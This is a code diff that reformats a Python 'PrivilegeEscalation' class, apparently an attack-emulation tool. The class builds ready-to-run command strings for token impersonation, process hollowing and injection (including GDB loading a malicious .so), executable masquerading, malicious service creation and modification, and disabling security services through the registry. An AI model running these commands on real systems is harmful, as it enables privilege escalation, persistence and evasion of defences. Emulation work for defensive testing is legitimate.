@@ -268,8 +268,10 @@ class PrivilegeEscalation:
 
                 elif method == "process":
                     # Using a process to impersonate
+                    gcred = f"Get-Credential -UserName {target_user}"
                     result["details"]["command"] = (
-                        f"Start-Process -FilePath cmd.exe -ArgumentList '/c whoami' -Credential (Get-Credential -UserName {target_user})"
+                        "Start-Process -FilePath cmd.exe -ArgumentList '/c whoami' "
+                        f"-Credential ({gcred})"
                     )
                     result["details"]["technique_details"] = (
                         f"Process creation with credentials for {target_user}"
@@ -334,10 +336,12 @@ class PrivilegeEscalation:
                 if method == "api":
                     # Using Windows API directly
                     result["details"]["command"] = (
-                        "Custom code using OpenProcess, OpenProcessToken, and DuplicateToken API calls"
+                        "Custom code using OpenProcess, OpenProcessToken, and "
+                        "DuplicateToken API calls"
                     )
                     result["details"]["technique_details"] = (
-                        f"Direct API calls to duplicate token from {source_process} to {target_process}"
+                        "Direct API calls to duplicate token from "
+                        f"{source_process} to {target_process}"
                     )
                     result["details"]["api_calls"] = [
                         "OpenProcess",
@@ -357,8 +361,9 @@ class PrivilegeEscalation:
 
                 elif method == "powershell":
                     # Using PowerShell
+                    uname = data.get("username", "Administrator")
                     result["details"]["command"] = (
-                        f"Invoke-TokenManipulation -ImpersonateUser -Username {data.get('username', 'Administrator')}"
+                        f"Invoke-TokenManipulation -ImpersonateUser -Username {uname}"
                     )
                     result["details"]["technique_details"] = (
                         "Using PowerSploit's Invoke-TokenManipulation"
@@ -416,7 +421,8 @@ class PrivilegeEscalation:
                 elif method == "scheduled_task":
                     # Using scheduled tasks
                     result["details"]["command"] = (
-                        f'schtasks /create /tn "PrivEsc" /tr "cmd.exe" /sc once /st 00:00 /ru {target_user} /rp PASSWORD'
+                        f'schtasks /create /tn "PrivEsc" /tr "cmd.exe" /sc once /st 00:00 '
+                        f"/ru {target_user} /rp PASSWORD"
                     )
                     result["details"]["technique_details"] = (
                         f"Create scheduled task as {target_user}"
@@ -486,7 +492,8 @@ class PrivilegeEscalation:
                 if method == "direct":
                     # Using direct API calls
                     result["details"]["command"] = (
-                        "Custom code using CreateProcess, ZwUnmapViewOfSection, and WriteProcessMemory API calls"
+                        "Custom code using CreateProcess, ZwUnmapViewOfSection, and "
+                        "WriteProcessMemory API calls"
                     )
                     result["details"]["technique_details"] = (
                         f"Direct API calls to hollow {target_process}"
@@ -530,7 +537,9 @@ class PrivilegeEscalation:
                 "integrity": (
                     "System" if target_process in ["lsass.exe", "services.exe"] else "High"
                 ),
-                "command_line": f"{target_process} {'-k netsvcs' if target_process == 'svchost.exe' else ''}",
+                "command_line": (
+                    f"{target_process} {'-k netsvcs' if target_process == 'svchost.exe' else ''}"
+                ),
             }
             result["details"]["process"] = process_details
 
@@ -585,7 +594,8 @@ class PrivilegeEscalation:
                     if method == "direct":
                         # Classic injection using direct API calls
                         result["details"]["command"] = (
-                            "Custom code using OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread API calls"
+                            "Custom code using OpenProcess, VirtualAllocEx, "
+                            "WriteProcessMemory, and CreateRemoteThread API calls"
                         )
                         result["details"]["technique_details"] = (
                             f"Direct API calls to inject into {target_process}"
@@ -641,8 +651,10 @@ class PrivilegeEscalation:
                     ]
             else:  # Linux/Unix
                 if injection_type == "classic":
+                    gdb_path = "/path/to/malicious.so"
                     result["details"]["command"] = (
-                        f"gdb -p $(pgrep {target_process}) -ex 'call dlopen(\"/path/to/malicious.so\", 1)' -ex 'quit'"
+                        f"gdb -p $(pgrep {target_process}) -ex "
+                        f"'call dlopen(\"{gdb_path}\", 1)' -ex 'quit'"
                     )
                     result["details"]["technique_details"] = (
                         f"Using GDB to inject shared library into {target_process}"
@@ -655,9 +667,12 @@ class PrivilegeEscalation:
                     )
 
             # Target process details
+            proc_root = (
+                "Windows" if target_process in ["explorer.exe", "svchost.exe"] else "Program Files"
+            )
             process_details = {
                 "pid": random.randint(1000, 9999),
-                "path": f"C:\\{'Windows' if target_process in ['explorer.exe', 'svchost.exe'] else 'Program Files'}\\{target_process}",
+                "path": rf"C:\{proc_root}\{target_process}",
                 "user": (
                     "NT AUTHORITY\\SYSTEM"
                     if target_process in ["lsass.exe", "services.exe", "svchost.exe"]
@@ -749,7 +764,8 @@ class PrivilegeEscalation:
                 elif method == "icon":
                     # Icon and resource masquerading
                     result["details"]["command"] = (
-                        "ResourceHacker.exe -open malicious.exe -save {masquerade_as} -action addoverwrite -res legitimate.exe"
+                        f"ResourceHacker.exe -open malicious.exe -save {masquerade_as} "
+                        "-action addoverwrite -res legitimate.exe"
                     )
                     result["details"]["technique_details"] = (
                         f"Copying resources from legitimate {masquerade_as} to malicious executable"
@@ -787,7 +803,10 @@ class PrivilegeEscalation:
                     else (
                         f"C:\\Windows\\System32\\{masquerade_as}"
                         if method == "path"
-                        else f"C:\\Users\\{os.environ.get('USERNAME', 'User')}\\Downloads\\{masquerade_as}"
+                        else (
+                            rf"C:\Users\{os.environ.get('USERNAME', 'User')}"
+                            rf"\Downloads\{masquerade_as}"
+                        )
                     )
                 ),
                 "detection_evasion": (
@@ -840,20 +859,37 @@ class PrivilegeEscalation:
             if os.name == "nt":  # Windows
                 # Using sc command
                 result["details"]["command"] = (
-                    f'sc create {service_name} binPath= "{binary_path}" start= {start_type} DisplayName= "{display_name}"'
+                    f'sc create {service_name} binPath= "{binary_path}" '
+                    f'start= {start_type} DisplayName= "{display_name}"'
+                )
+                pst = (
+                    "Automatic"
+                    if start_type == "auto"
+                    else "Manual"
+                    if start_type == "demand"
+                    else "Disabled"
                 )
                 result["details"]["powershell_command"] = (
-                    f'New-Service -Name {service_name} -BinaryPathName "{binary_path}" -DisplayName "{display_name}" -StartupType {"Automatic" if start_type == "auto" else "Manual" if start_type == "demand" else "Disabled"}'
+                    f"New-Service -Name {service_name} "
+                    f'-BinaryPathName "{binary_path}" -DisplayName "{display_name}" '
+                    f"-StartupType {pst}"
                 )
 
                 # Registry alternative
+                svc_key = rf"HKLM\SYSTEM\CurrentControlSet\Services\{service_name}"
                 result["details"]["registry_command"] = (
-                    f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}" /v ImagePath /t REG_EXPAND_SZ /d "{binary_path}" /f'
+                    f'reg add "{svc_key}" /v ImagePath /t REG_EXPAND_SZ '
+                    rf'/d "{binary_path}" /f'
                 )
             else:  # Linux/Unix
                 service_file = f"/etc/systemd/system/{service_name}.service"
+                unit_body = (
+                    f"'[Unit]\\nDescription={display_name}\\n\\n"
+                    f"[Service]\\nExecStart={binary_path}\\n\\n"
+                    f"[Install]\\nWantedBy=multi-user.target'"
+                )
                 result["details"]["command"] = (
-                    f"echo '[Unit]\nDescription={display_name}\n\n[Service]\nExecStart={binary_path}\n\n[Install]\nWantedBy=multi-user.target' > {service_file} && systemctl enable {service_name}"
+                    f"echo {unit_body} > {service_file} && systemctl enable {service_name}"
                 )
                 result["details"]["technique_details"] = (
                     f"Creating systemd service at {service_file}"
@@ -932,8 +968,9 @@ class PrivilegeEscalation:
                     result["details"]["command"] = (
                         f'sc config {service_name} binPath= "{new_value}"'
                     )
+                    hk = rf"HKLM:\SYSTEM\CurrentControlSet\Services\{service_name}"
                     result["details"]["powershell_command"] = (
-                        f'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}" -Name "ImagePath" -Value "{new_value}"'
+                        f'Set-ItemProperty -Path "{hk}" -Name "ImagePath" -Value "{new_value}"'
                     )
 
                 elif modification_type == "start_type":
@@ -945,33 +982,39 @@ class PrivilegeEscalation:
 
                 elif modification_type == "account":
                     # Modify service account
+                    acct_pw = data.get("password", "P@ssw0rd")
                     result["details"]["command"] = (
-                        f'sc config {service_name} obj= "{new_value}" password= "{data.get("password", "P@ssw0rd")}"'
+                        f'sc config {service_name} obj= "{new_value}" password= "{acct_pw}"'
                     )
+                    filt = rf"Name='{service_name}'"
                     result["details"]["powershell_command"] = (
-                        f'$svc = Get-WmiObject -Class Win32_Service -Filter "Name=\'{service_name}\'"; $svc.Change($null,$null,$null,$null,$null,$null,"{new_value}","{data.get("password", "P@ssw0rd")}"); $svc.Put()'
+                        f"$svc = Get-WmiObject -Class Win32_Service "
+                        rf'-Filter "{filt}"; '
+                        f'$svc.Change($null,$null,$null,$null,$null,$null,"{new_value}",'
+                        f'"{acct_pw}"); $svc.Put()'
                     )
             else:  # Linux/Unix
                 service_file = f"/etc/systemd/system/{service_name}.service"
                 if modification_type == "binary_path":
                     result["details"]["command"] = (
-                        f"sed -i 's|^ExecStart=.*|ExecStart={new_value}|' {service_file} && systemctl daemon-reload"
+                        f"sed -i 's|^ExecStart=.*|ExecStart={new_value}|' {service_file} "
+                        "&& systemctl daemon-reload"
                     )
                     result["details"]["technique_details"] = (
                         f"Modifying ExecStart in {service_file}"
                     )
 
                 elif modification_type == "start_type":
-                    result["details"]["command"] = (
-                        f"systemctl {'enable' if new_value in ['auto', 'automatic'] else 'disable'} {service_name}"
-                    )
+                    en_dis = "enable" if new_value in ["auto", "automatic"] else "disable"
+                    result["details"]["command"] = f"systemctl {en_dis} {service_name}"
                     result["details"]["technique_details"] = (
                         f"Changing startup type of {service_name}"
                     )
 
                 elif modification_type == "account":
                     result["details"]["command"] = (
-                        f"sed -i 's|^User=.*|User={new_value}|' {service_file} && systemctl daemon-reload"
+                        f"sed -i 's|^User=.*|User={new_value}|' {service_file} "
+                        "&& systemctl daemon-reload"
                     )
                     result["details"]["technique_details"] = (
                         f"Changing service user in {service_file}"
@@ -1066,8 +1109,9 @@ class PrivilegeEscalation:
                             f"Get-Process -Name {service} | Stop-Process -Force"
                         )
                     elif method == "registry":
+                        rkey = rf"HKLM\SYSTEM\CurrentControlSet\Services\{service}"
                         result["details"]["command"] = (
-                            f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service}" /v Start /t REG_DWORD /d 4 /f'
+                            f'reg add "{rkey}" /v Start /t REG_DWORD /d 4 /f'
                         )
                         result["details"]["technique_details"] = (
                             f"Disabling {service} via registry modification"
